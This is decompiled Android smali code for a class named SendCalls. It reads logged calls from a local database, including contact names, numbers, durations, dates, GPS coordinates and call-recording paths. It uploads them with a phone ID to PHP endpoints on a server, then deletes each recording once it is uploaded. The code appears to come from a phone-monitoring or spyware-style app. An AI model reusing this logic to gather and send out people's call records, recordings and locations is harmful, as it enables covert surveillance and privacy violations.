.class public final Lec;
.super Ljava/lang/Object;
.source "SendCalls.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field private static a:Z


# instance fields
.field private final b:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0

    .line 30
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 31
    iput-object p1, p0, Lec;->b:Landroid/content/Context;

    return-void
.end method

.method private a()V
    .locals 4

    .line 133
    :try_start_0
    invoke-static {}, Lcom/app/service/UploadDataService;->a()V

    .line 135
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "UploadDataService.getmNbTask() : "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 137
    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v0

    if-gtz v0, :cond_0

    .line 138
    iget-object v0, p0, Lec;->b:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lec;->b:Landroid/content/Context;

    const-class v3, Lcom/app/service/UploadDataService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v0

    .line 141
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    return-void
.end method

.method private static a(Ljava/util/HashMap;Lbb;Lex$a;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;",
            "Lbb;",
            "Lex$a;",
            ")V"
        }
    .end annotation

    :try_start_0
    const-string v0, "calls/insertCall.php"

    .line 163
    invoke-static {v0, p0}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result p0

    if-eqz p0, :cond_0

    .line 164
    invoke-virtual {p2}, Lex$a;->b()I

    move-result p0

    invoke-virtual {p1, p0}, Lbb;->a(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception p0

    .line 167
    invoke-virtual {p0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    return-void
.end method

.method private static a(Ljava/util/HashMap;Lbb;Lex$a;Ljava/io/File;)V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Lare;",
            ">;",
            "Lbb;",
            "Lex$a;",
            "Ljava/io/File;",
            ")V"
        }
    .end annotation

    :try_start_0
    const-string v0, "multipart/form-data"

    .line 147
    invoke-static {v0}, Laqy;->b(Ljava/lang/String;)Laqy;

    move-result-object v0

    invoke-static {v0, p3}, Lare;->create(Laqy;Ljava/io/File;)Lare;

    move-result-object v0

    const-string v1, "uploadedfile"

    .line 148
    invoke-virtual {p3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v0}, Laqz$b;->a(Ljava/lang/String;Ljava/lang/String;Lare;)Laqz$b;

    move-result-object v0

    const-string v1, "calls/insertCallRecord.php"

    .line 150
    invoke-static {v1, p0, v0}, Lcv;->a(Ljava/lang/String;Ljava/util/HashMap;Laqz$b;)Z

    move-result p0

    if-eqz p0, :cond_0

    .line 151
    invoke-virtual {p2}, Lex$a;->b()I

    move-result p0

    invoke-virtual {p1, p0}, Lbb;->a(I)Z

    move-result p0

    if-eqz p0, :cond_0

    .line 152
    invoke-virtual {p3}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception p0

    .line 156
    invoke-virtual {p0}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 157
    invoke-static {p0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 20

    move-object/from16 v1, p0

    .line 36
    sget-boolean v0, Lec;->a:Z

    if-eqz v0, :cond_0

    .line 37
    invoke-direct/range {p0 .. p0}, Lec;->a()V

    return-void

    :cond_0
    const/4 v0, 0x1

    .line 41
    sput-boolean v0, Lec;->a:Z

    const/4 v2, 0x0

    .line 44
    :try_start_0
    new-instance v3, Lbb;

    iget-object v4, v1, Lec;->b:Landroid/content/Context;

    invoke-direct {v3, v4}, Lbb;-><init>(Landroid/content/Context;)V

    .line 45
    invoke-virtual {v3}, Lbb;->a()V

    .line 1066
    iget-object v5, v3, Lbb;->a:Landroid/database/sqlite/SQLiteDatabase;

    const-string v6, "TABLE_CONFIG_CALLS"

    const/16 v4, 0xb

    new-array v7, v4, [Ljava/lang/String;

    const-string v4, "id"

    aput-object v4, v7, v2

    const-string v4, "name"

    aput-object v4, v7, v0

    const-string v4, "number"

    const/4 v13, 0x2

    aput-object v4, v7, v13

    const-string v4, "type"

    const/4 v14, 0x3

    aput-object v4, v7, v14

    const-string v4, "duration"

    const/4 v15, 0x4

    aput-object v4, v7, v15

    const-string v4, "date"

    const/4 v12, 0x5

    aput-object v4, v7, v12

    const-string v4, "address"

    const/4 v11, 0x6

    aput-object v4, v7, v11

    const-string v4, "longitude"

    const/4 v10, 0x7

    aput-object v4, v7, v10

    const-string v4, "latitude"

    const/16 v9, 0x8

    aput-object v4, v7, v9

    const-string v4, "accuracy"

    const/16 v8, 0x9

    aput-object v4, v7, v8

    const-string v4, "pathfile"

    const/16 v15, 0xa

    aput-object v4, v7, v15

    const/4 v4, 0x0

    const/16 v16, 0x0

    const/16 v17, 0x0

    const/16 v18, 0x0

    const/16 v19, 0x0

    const/16 v15, 0x9

    move-object v8, v4

    const/16 v4, 0x8

    move-object/from16 v9, v16

    const/4 v15, 0x7

    move-object/from16 v10, v17

    const/4 v4, 0x6

    move-object/from16 v11, v18

    const/4 v15, 0x5

    move-object/from16 v12, v19

    invoke-virtual/range {v5 .. v12}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v5

    if-eqz v5, :cond_7

    .line 51
    invoke-interface {v5}, Landroid/database/Cursor;->getCount()I

    move-result v6

    if-lez v6, :cond_7

    .line 52
    invoke-interface {v5}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v6

    if-eqz v6, :cond_7

    .line 54
    :goto_0
    new-instance v6, Lex$a;

    invoke-direct {v6}, Lex$a;-><init>()V

    .line 55
    invoke-interface {v5, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v7

    invoke-virtual {v6, v7}, Lex$a;->a(I)V

    .line 56
    invoke-interface {v5, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lex$a;->b(Ljava/lang/String;)V

    .line 57
    invoke-interface {v5, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lex$a;->c(Ljava/lang/String;)V

    .line 58
    invoke-interface {v5, v14}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lex$a;->e(Ljava/lang/String;)V

    const/4 v7, 0x4

    .line 59
    invoke-interface {v5, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Lex$a;->d(Ljava/lang/String;)V

    .line 60
    invoke-interface {v5, v15}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Lex$a;->f(Ljava/lang/String;)V

    .line 61
    invoke-interface {v5, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Lex$a;->g(Ljava/lang/String;)V

    const/4 v8, 0x7

    .line 62
    invoke-interface {v5, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v9}, Lex$a;->h(Ljava/lang/String;)V

    const/16 v9, 0x8

    .line 63
    invoke-interface {v5, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v6, v10}, Lex$a;->i(Ljava/lang/String;)V

    const/16 v10, 0x9

    .line 64
    invoke-interface {v5, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v11}, Lex$a;->j(Ljava/lang/String;)V

    const/16 v11, 0xa

    .line 65
    invoke-interface {v5, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v6, v12}, Lex$a;->a(Ljava/lang/String;)V

    .line 67
    new-instance v12, Ljava/util/HashMap;

    invoke-direct {v12}, Ljava/util/HashMap;-><init>()V

    const-string v0, "idPhone"

    .line 68
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v7, v1, Lec;->b:Landroid/content/Context;

    invoke-static {v7}, Lda;->f(Landroid/content/Context;)I

    move-result v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "name"

    .line 69
    invoke-virtual {v6}, Lex$a;->c()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "number"

    .line 70
    invoke-virtual {v6}, Lex$a;->d()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "type"

    .line 71
    invoke-virtual {v6}, Lex$a;->f()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "duration"

    .line 72
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6}, Lex$a;->e()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "date"

    .line 73
    invoke-virtual {v6}, Lex$a;->g()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "address"

    .line 74
    invoke-virtual {v6}, Lex$a;->h()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "longitude"

    .line 75
    invoke-virtual {v6}, Lex$a;->i()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "latitude"

    .line 76
    invoke-virtual {v6}, Lex$a;->j()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "accuracy"

    .line 77
    invoke-virtual {v6}, Lex$a;->k()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v12, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 79
    invoke-virtual {v6}, Lex$a;->a()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-virtual {v6}, Lex$a;->a()Ljava/lang/String;

    move-result-object v0

    const-string v4, ""

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    .line 80
    new-instance v0, Ljava/io/File;

    invoke-virtual {v6}, Lex$a;->a()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v0, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 82
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_3

    .line 83
    new-instance v4, Ljava/util/HashMap;

    invoke-direct {v4}, Ljava/util/HashMap;-><init>()V

    const-string v7, "idPhone"

    .line 84
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v8, v1, Lec;->b:Landroid/content/Context;

    invoke-static {v8}, Lda;->f(Landroid/content/Context;)I

    move-result v8

    invoke-virtual {v12, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "name"

    .line 85
    invoke-virtual {v6}, Lex$a;->c()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "number"

    .line 86
    invoke-virtual {v6}, Lex$a;->d()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "type"

    .line 87
    invoke-virtual {v6}, Lex$a;->f()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "duration"

    .line 88
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6}, Lex$a;->e()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v8, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "date"

    .line 89
    invoke-virtual {v6}, Lex$a;->g()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "address"

    .line 90
    invoke-virtual {v6}, Lex$a;->h()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "longitude"

    .line 91
    invoke-virtual {v6}, Lex$a;->i()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "latitude"

    .line 92
    invoke-virtual {v6}, Lex$a;->j()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "accuracy"

    .line 93
    invoke-virtual {v6}, Lex$a;->k()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "pathFile"

    .line 94
    invoke-virtual {v0}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v4, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 96
    iget-object v7, v1, Lec;->b:Landroid/content/Context;

    invoke-static {v7}, Ldb;->b(Landroid/content/Context;)Z

    move-result v7

    if-eqz v7, :cond_1

    .line 97
    iget-object v7, v1, Lec;->b:Landroid/content/Context;

    invoke-static {v7}, Ler;->h(Landroid/content/Context;)Z

    move-result v7

    if-eqz v7, :cond_5

    .line 98
    invoke-static {v4, v3, v6, v0}, Lec;->a(Ljava/util/HashMap;Lbb;Lex$a;Ljava/io/File;)V

    goto :goto_1

    .line 100
    :cond_1
    iget-object v7, v1, Lec;->b:Landroid/content/Context;

    invoke-static {v7}, Ler;->h(Landroid/content/Context;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 101
    invoke-static {v4, v3, v6, v0}, Lec;->a(Ljava/util/HashMap;Lbb;Lex$a;Ljava/io/File;)V

    goto :goto_1

    .line 103
    :cond_2
    iget-object v7, v1, Lec;->b:Landroid/content/Context;

    invoke-static {v0, v7}, Ler;->a(Ljava/io/File;Landroid/content/Context;)Z

    move-result v7

    if-eqz v7, :cond_5

    .line 104
    invoke-static {v4, v3, v6, v0}, Lec;->a(Ljava/util/HashMap;Lbb;Lex$a;Ljava/io/File;)V

    goto :goto_1

    .line 108
    :cond_3
    invoke-static {v12, v3, v6}, Lec;->a(Ljava/util/HashMap;Lbb;Lex$a;)V

    goto :goto_1

    .line 112
    :cond_4
    invoke-static {v12, v3, v6}, Lec;->a(Ljava/util/HashMap;Lbb;Lex$a;)V

    .line 115
    :cond_5
    :goto_1
    invoke-interface {v5}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_6

    goto :goto_2

    :cond_6
    const/4 v0, 0x1

    const/4 v4, 0x6

    goto/16 :goto_0

    :cond_7
    :goto_2
    if-eqz v5, :cond_8

    .line 119
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    .line 121
    :cond_8
    invoke-virtual {v3}, Lbb;->b()V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :catch_0
    move-exception v0

    .line 123
    invoke-virtual {v0}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 124
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    .line 127
    :goto_3
    sput-boolean v2, Lec;->a:Z

    .line 128
    invoke-direct/range {p0 .. p0}, Lec;->a()V

    return-void
.end method
